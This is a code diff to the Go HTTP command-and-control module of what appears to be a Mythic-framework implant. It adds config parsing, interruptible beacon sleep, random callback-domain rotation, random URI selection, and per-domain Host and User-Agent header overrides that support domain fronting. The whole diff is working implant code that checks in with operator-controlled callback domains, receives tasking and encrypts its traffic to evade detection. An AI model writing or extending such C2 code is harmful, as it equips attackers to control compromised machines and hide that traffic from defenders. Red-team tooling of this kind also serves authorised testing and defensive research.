@@ -29,63 +29,218 @@ import (
 var httpx_initial_config string
 
 type HTTPxInitialConfig struct {
-	Killdate               string          `json:"killdate"`
-	Interval               uint            `json:"callback_interval"`
-	Jitter                 uint            `json:"callback_jitter"`
-	CallbackDomains        []string        `json:"callback_domains"`
-	DomainRotationMethod   string          `json:"domain_rotation"`
-	FailoverThreshold      int             `json:"failover_threshold"`
-	EncryptedExchangeCheck bool            `json:"encrypted_exchange_check"`
-	AESPSK                 string          `json:"AESPSK"`
+	Killdate               string
+	Interval               uint
+	Jitter                 uint
+	CallbackDomains        []string
+	DomainRotationMethod   string
+	FailoverThreshold      int
+	EncryptedExchangeCheck bool
+	AESPSK                 string
 	RawC2Config            AgentVariations `json:"raw_c2_config"`
 }
+
+func (e *HTTPxInitialConfig) parseAgentVariationConfigMessageTransform(configArray []interface{}) []AgentVariationConfigMessageTransform {
+	if configArray == nil {
+		return make([]AgentVariationConfigMessageTransform, 0)
+	}
+	config := make([]AgentVariationConfigMessageTransform, len(configArray))
+	for i := 0; i < len(configArray); i++ {
+		entry := configArray[i].(map[string]interface{})
+		config[i] = AgentVariationConfigMessageTransform{
+			Action: entry["action"].(string),
+		}
+		if entry["value"] != nil {
+			config[i].Value = entry["value"].(string)
+		}
+	}
+	return config
+}
+func (e *HTTPxInitialConfig) parseAgentVariationConfigClient(configMap map[string]interface{}) AgentVariationConfigClient {
+	config := AgentVariationConfigClient{}
+	if headers, ok := configMap["headers"]; ok && headers != nil {
+		config.Headers = e.parseMapStringString(headers.(map[string]interface{}))
+	} else {
+		config.Headers = make(map[string]string)
+	}
+	if parameters, ok := configMap["parameters"]; ok && parameters != nil {
+		config.Parameters = e.parseMapStringString(parameters.(map[string]interface{}))
+	} else {
+		config.Parameters = make(map[string]string)
+	}
+
+	if headers, ok := configMap["domain_specific_headers"]; ok && headers != nil {
+		DomainHeaders := make(map[string]map[string]string)
+		for j, k := range headers.(map[string]interface{}) {
+			DomainHeaders[j] = e.parseMapStringString(k.(map[string]interface{}))
+		}
+		config.DomainSpecificHeaders = DomainHeaders
+	} else {
+		config.DomainSpecificHeaders = make(map[string]map[string]string)
+	}
+	if message, ok := configMap["message"]; ok && message != nil {
+		stringStringMessage := e.parseMapStringString(message.(map[string]interface{}))
+		config.Message.Name = stringStringMessage["name"]
+		config.Message.Location = stringStringMessage["location"]
+	}
+	if transforms, ok := configMap["transforms"]; ok && transforms != nil {
+		config.Transforms = e.parseAgentVariationConfigMessageTransform(transforms.([]interface{}))
+	} else {
+		config.Transforms = []AgentVariationConfigMessageTransform{}
+	}
+	return config
+}
+func (e *HTTPxInitialConfig) parseAgentVariationConfigServer(configMap map[string]interface{}) AgentVariationConfigServer {
+	config := AgentVariationConfigServer{}
+	if headers, ok := configMap["headers"]; ok && headers != nil {
+		config.Headers = e.parseMapStringString(headers.(map[string]interface{}))
+	} else {
+		config.Headers = make(map[string]string)
+	}
+	if transforms, ok := configMap["transforms"]; ok && transforms != nil {
+		config.Transforms = e.parseAgentVariationConfigMessageTransform(transforms.([]interface{}))
+	} else {
+		config.Transforms = []AgentVariationConfigMessageTransform{}
+	}
+	return config
+}
+func (e *HTTPxInitialConfig) parseMapStringString(configMap map[string]interface{}) map[string]string {
+	serverHeaders := make(map[string]string)
+	if configMap != nil {
+		for j, k := range configMap {
+			serverHeaders[j] = k.(string)
+		}
+	}
+	return serverHeaders
+}
+func (e *HTTPxInitialConfig) parseStringArray(configArray []interface{}) []string {
+	urls := make([]string, len(configArray))
+	if configArray != nil {
+		for l, p := range configArray {
+			urls[l] = p.(string)
+		}
+	}
+	return urls
+}
+func (e *HTTPxInitialConfig) parseRawC2Config(configMap map[string]interface{}) AgentVariations {
+	RawC2Config := AgentVariations{}
+	getConfig := AgentVariationConfig{}
+	postConfig := AgentVariationConfig{}
+	RawC2Config.Name = configMap["name"].(string)
+
+	get := configMap["get"].(map[string]interface{})
+	getConfig.Verb = get["verb"].(string)
+	if uris, ok := get["uris"]; ok {
+		getConfig.URIs = e.parseStringArray(uris.([]interface{}))
+	}
+	if clientConfig, ok := get["client"]; ok && clientConfig != nil {
+		getConfig.Client = e.parseAgentVariationConfigClient(clientConfig.(map[string]interface{}))
+	}
+	if serverConfig, ok := get["server"]; ok && serverConfig != nil {
+		getConfig.Server = e.parseAgentVariationConfigServer(serverConfig.(map[string]interface{}))
+	}
+
+	post := configMap["post"].(map[string]interface{})
+	postConfig.Verb = post["verb"].(string)
+	if uris, ok := post["uris"]; ok {
+		postConfig.URIs = e.parseStringArray(uris.([]interface{}))
+	}
+	if clientConfig, ok := post["client"]; ok && clientConfig != nil {
+		postConfig.Client = e.parseAgentVariationConfigClient(clientConfig.(map[string]interface{}))
+	}
+	if serverConfig, ok := post["server"]; ok && serverConfig != nil {
+		postConfig.Server = e.parseAgentVariationConfigServer(serverConfig.(map[string]interface{}))
+	}
+
+	RawC2Config.Get = getConfig
+	RawC2Config.Post = postConfig
+	return RawC2Config
+}
+func (e *HTTPxInitialConfig) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["killdate"]; ok {
+		e.Killdate = v.(string)
+	}
+	if v, ok := alias["callback_interval"]; ok {
+		e.Interval = uint(v.(float64))
+	}
+	if v, ok := alias["callback_jitter"]; ok {
+		e.Jitter = uint(v.(float64))
+	}
+	if v, ok := alias["encrypted_exchange_check"]; ok {
+		e.EncryptedExchangeCheck = v.(bool)
+	}
+	if v, ok := alias["AESPSK"]; ok {
+		e.AESPSK = v.(string)
+	}
+	if v, ok := alias["domain_rotation"]; ok {
+		e.DomainRotationMethod = v.(string)
+	}
+	if v, ok := alias["failover_threshold"]; ok {
+		e.FailoverThreshold = int(v.(float64))
+	}
+	if v, ok := alias["callback_domains"]; ok {
+		e.CallbackDomains = e.parseStringArray(v.([]interface{}))
+	}
+	if v, ok := alias["raw_c2_config"]; ok {
+		e.RawC2Config = e.parseRawC2Config(v.(map[string]interface{}))
+	}
+	return nil
+}
+
 type AgentVariationConfigMessageTransform struct {
-	Action string `json:"action" toml:"action"`
-	Value  string `json:"value" toml:"value"`
+	Action string
+	Value  string
 }
 type AgentVariationConfigMessage struct {
-	Location string `json:"location" toml:"location"`
-	Name     string `json:"name" toml:"name"`
+	Location string
+	Name     string
 }
 type AgentVariationConfigClient struct {
-	Headers    map[string]string                      `json:"headers" toml:"headers"`
-	Parameters map[string]string                      `json:"parameters" toml:"parameters"`
-	Message    AgentVariationConfigMessage            `json:"message" toml:"message"`
-	Transforms []AgentVariationConfigMessageTransform `json:"transforms" toml:"transforms"`
+	Headers               map[string]string
+	Parameters            map[string]string
+	DomainSpecificHeaders map[string]map[string]string
+	Message               AgentVariationConfigMessage
+	Transforms            []AgentVariationConfigMessageTransform
 }
 type AgentVariationConfigServer struct {
-	Headers    map[string]string                      `json:"headers" toml:"headers"`
-	Transforms []AgentVariationConfigMessageTransform `json:"transforms" toml:"transforms"`
+	Headers    map[string]string
+	Transforms []AgentVariationConfigMessageTransform
 }
 type AgentVariationConfig struct {
-	Verb   string                     `json:"verb" toml:"verb"`
-	URI    string                     `json:"uri" toml:"uri"`
-	Client AgentVariationConfigClient `json:"client" toml:"client"`
-	Server AgentVariationConfigServer `json:"server" toml:"server"`
+	Verb   string
+	URIs   []string
+	Client AgentVariationConfigClient
+	Server AgentVariationConfigServer
 }
 type AgentVariations struct {
-	Name string               `json:"name" toml:"name"`
-	Get  AgentVariationConfig `json:"get" toml:"get"`
-	Post AgentVariationConfig `json:"post" toml:"post"`
+	Name string
+	Get  AgentVariationConfig
+	Post AgentVariationConfig
 }
 
 type C2HTTPx struct {
-	Interval                 int       `json:"interval"`
-	Jitter                   int       `json:"jitter"`
-	CallbackDomains          []string  `json:"callback_domains"`
-	CallbackDomainsFailCount []int     `json:"callback_domains_fail_count"`
-	CurrentDomain            int       `json:"current_domain"`
-	DomainRotationMethod     string    `json:"domain_rotation"`
-	FailoverThreshold        int       `json:"failover_threshold"`
-	Killdate                 time.Time `json:"killdate"`
+	Interval                 int
+	Jitter                   int
+	CallbackDomains          []string
+	CallbackDomainsFailCount []int
+	CurrentDomain            int
+	DomainRotationMethod     string
+	FailoverThreshold        int
+	Killdate                 time.Time
 	ExchangingKeys           bool
-	ChunkSize                int `json:"chunk_size"`
+	ChunkSize                int
 	// internally set pieces
-	Config         AgentVariations `json:"config"`
-	Key            string          `json:"encryption_key"`
-	RsaPrivateKey  *rsa.PrivateKey
-	ShouldStop     bool
-	stoppedChannel chan bool
+	Config                AgentVariations
+	Key                   string
+	RsaPrivateKey         *rsa.PrivateKey
+	ShouldStop            bool
+	stoppedChannel        chan bool
+	interruptSleepChannel chan bool
 }
 
 // New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
@@ -108,14 +263,15 @@ func init() {
 		os.Exit(1)
 	}
 	profile := C2HTTPx{
-		Key:                  initialConfig.AESPSK,
-		Killdate:             killDateTime,
-		CallbackDomains:      initialConfig.CallbackDomains,
-		CurrentDomain:        0,
-		FailoverThreshold:    initialConfig.FailoverThreshold,
-		DomainRotationMethod: initialConfig.DomainRotationMethod,
-		ShouldStop:           true,
-		stoppedChannel:       make(chan bool, 1),
+		Key:                   initialConfig.AESPSK,
+		Killdate:              killDateTime,
+		CallbackDomains:       initialConfig.CallbackDomains,
+		CurrentDomain:         0,
+		FailoverThreshold:     initialConfig.FailoverThreshold,
+		DomainRotationMethod:  initialConfig.DomainRotationMethod,
+		ShouldStop:            true,
+		stoppedChannel:        make(chan bool, 1),
+		interruptSleepChannel: make(chan bool, 1),
 	}
 	// set initial fail counts to be 0
 	CallbackDomainFailCounts := make([]int, len(initialConfig.CallbackDomains))
@@ -181,7 +337,7 @@ func (c *C2HTTPx) Start() {
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
 							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
-							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+							c.Sleep()
 							continue
 						}
 						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
@@ -189,13 +345,20 @@ func (c *C2HTTPx) Start() {
 				} else {
 					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
 				}
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 			}
 		} else {
 			//fmt.Printf("Uh oh, failed to checkin\n")
 		}
 	}
 
+}
+func (c *C2HTTPx) Sleep() {
+	// wait for either sleep time duration or sleep interrupt
+	select {
+	case <-c.interruptSleepChannel:
+	case <-time.After(time.Second * time.Duration(GetSleepTime())):
+	}
 }
 func (c *C2HTTPx) Stop() {
 	if c.ShouldStop {
@@ -215,11 +378,17 @@ func (c *C2HTTPx) UpdateConfig(parameter string, value string) {
 		if err == nil {
 			c.Interval = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "jitter":
 		newInt, err := strconv.Atoi(value)
 		if err == nil {
 			c.Jitter = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "killdate":
 		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
 		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
@@ -277,6 +446,9 @@ func (c *C2HTTPx) GetKillDate() time.Time {
 func (c *C2HTTPx) SetSleepInterval(interval int) string {
 	if interval >= 0 {
 		c.Interval = interval
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
 	} else {
 		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
@@ -286,6 +458,9 @@ func (c *C2HTTPx) SetSleepInterval(interval int) string {
 func (c *C2HTTPx) SetSleepJitter(jitter int) string {
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
 	} else {
 		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
@@ -322,7 +497,7 @@ func (c *C2HTTPx) CheckIn() structs.CheckInMessageResponse {
 		}
 		checkin := CreateCheckinMessage()
 		if raw, err := json.Marshal(checkin); err != nil {
-			time.Sleep(time.Duration(c.GetSleepTime()))
+			c.Sleep()
 			continue
 		} else {
 			resp := c.SendMessage(raw, false)
@@ -331,14 +506,14 @@ func (c *C2HTTPx) CheckIn() structs.CheckInMessageResponse {
 			response := structs.CheckInMessageResponse{}
 			if err = json.Unmarshal(resp, &response); err != nil {
 				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 			if len(response.ID) != 0 {
 				SetMythicID(response.ID)
 				return response
 			} else {
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 		}
@@ -413,6 +588,8 @@ func (c *C2HTTPx) increaseErrorCount() {
 		}
 	} else if c.DomainRotationMethod == "round-robin" {
 		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
+	} else if c.DomainRotationMethod == "random" {
+		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
 	} else {
 		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
 	}
@@ -422,6 +599,8 @@ func (c *C2HTTPx) increaseSuccessfulMessage() {
 		c.CallbackDomainsFailCount[c.CurrentDomain] = 0
 	} else if c.DomainRotationMethod == "round-robin" {
 		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
+	} else if c.DomainRotationMethod == "random" {
+		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
 	} else {
 		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
 	}
@@ -429,6 +608,10 @@ func (c *C2HTTPx) increaseSuccessfulMessage() {
 
 func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte {
 	// If the AesPSK is set, encrypt the data we send
+	defer func() {
+		// close all idle connections
+		client.CloseIdleConnections()
+	}()
 	if len(c.Key) != 0 {
 		//log.Printf("Encrypting Post data: %v\n", string(sendData))
 		sendData = c.encryptMessage(sendData)
@@ -464,7 +647,7 @@ func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte 
 			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
 			c.increaseErrorCount()
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if resp.StatusCode != 200 {
@@ -472,7 +655,7 @@ func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte 
 			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
 			c.increaseErrorCount()
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		raw, err := c.GetDynamicMessageResponse(resp, isGetTaskingRequest)
@@ -480,7 +663,7 @@ func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte 
 			utils.PrintDebug(fmt.Sprintf("error getting message response: %v\n", err))
 			c.increaseErrorCount()
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		raw, err = base64.StdEncoding.DecodeString(string(raw))
@@ -488,14 +671,14 @@ func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte 
 			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
 			c.increaseErrorCount()
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(raw) < 36 {
 			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
 			c.increaseErrorCount()
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(c.Key) != 0 {
@@ -506,7 +689,7 @@ func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte 
 				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
 				c.increaseErrorCount()
 				IncrementFailedConnection(c.ProfileName())
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 				continue
 			} else {
 				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
@@ -761,7 +944,9 @@ func (c *C2HTTPx) CreateDynamicMessage(content []byte, isGetTaskingRequest bool)
 		}
 	}
 	bodyBuffer = bytes.NewBuffer(bodyBytes)
-	url := c.CallbackDomains[c.CurrentDomain] + variation.URI
+	// select a URI from this variation at random
+	uriIndex := rand.Intn(len(variation.URIs))
+	url := c.CallbackDomains[c.CurrentDomain] + variation.URIs[uriIndex]
 	utils.PrintDebug(fmt.Sprintf("method: %s\nURL: %s\n", variation.Verb, url))
 	req, err := http.NewRequest(variation.Verb, url, bodyBuffer)
 	if err != nil {
@@ -794,6 +979,24 @@ func (c *C2HTTPx) CreateDynamicMessage(content []byte, isGetTaskingRequest bool)
 		} else {
 			req.Header.Set(key, variation.Client.Headers[key])
 		}
+	}
+	for domain, _ := range variation.Client.DomainSpecificHeaders {
+		if domain == c.CallbackDomains[c.CurrentDomain] {
+			for key, _ := range variation.Client.DomainSpecificHeaders[domain] {
+				if key == "Host" {
+					req.Host = variation.Client.DomainSpecificHeaders[domain][key]
+				} else if key == "User-Agent" {
+					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
+					tr.ProxyConnectHeader = http.Header{}
+					tr.ProxyConnectHeader.Add("User-Agent", variation.Client.DomainSpecificHeaders[domain][key])
+				} else if key == "Content-Length" {
+					continue
+				} else {
+					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
+				}
+			}
+		}
+
 	}
 	// adding query parameters is a little weird in go
 
